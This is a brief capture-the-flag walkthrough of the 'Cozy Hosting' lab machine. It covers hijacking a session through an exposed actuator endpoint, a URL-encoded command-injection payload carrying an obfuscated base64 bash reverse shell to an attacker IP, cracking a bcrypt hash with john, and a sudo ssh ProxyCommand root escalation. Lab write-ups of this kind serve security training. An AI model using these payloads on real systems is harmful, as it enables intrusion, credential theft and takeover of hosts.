# Solver Cozy Hosting User & root

## Recon

We found login page at /login
using nmap, dirbuster, gobuster dns ( enum subdomains ) and we found http://cozyhosting.htb/actuator

go to the http://cozyhosting.htb/actuator/sessions , we look like its JSESSIONID and the server use java, so lets we use that sessions then boom we login

## Exploit

After we go to the admin dashboard , we discover that the server use /bin/sh to do ssh _you can trigger by port host 127.0.0.1 and user any_, we can do command injection. this is my payload %3becho${IFS%25%3f%3f}"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xNS85MDAxIDA%2bJjEK"${IFS%25%3f%3f}|${IFS%25%3f%3f}base64${IFS%25%3f%3f}-d${IFS%25%3f%3f}|${IFS%25%3f%3f}bash%3b using base64 reverse shell than url encode

## Post Exploitation

After we got into the server we found the source code .jar in the server, we download it to local and decompile using jd-gui, we found psql ( postgresql creds ), we login psql and go to the database user, and decrypte the admin password using john

`shell
john --format=bcrypt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt admin_hash_psql.tx
`
Response :
`Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)
1g 0:00:00:07 DONE (2024-02-02 23:31) 0.1303g/s 366.1p/s 366.1c/s 366.1C/s 159159..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed`

After that we cat /etc/passwd to list all user and try the password that we already dec to all user and we found user josh, after that we sudo -l, we found binary ssh then using gtfobins.io to see the payload `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2'`
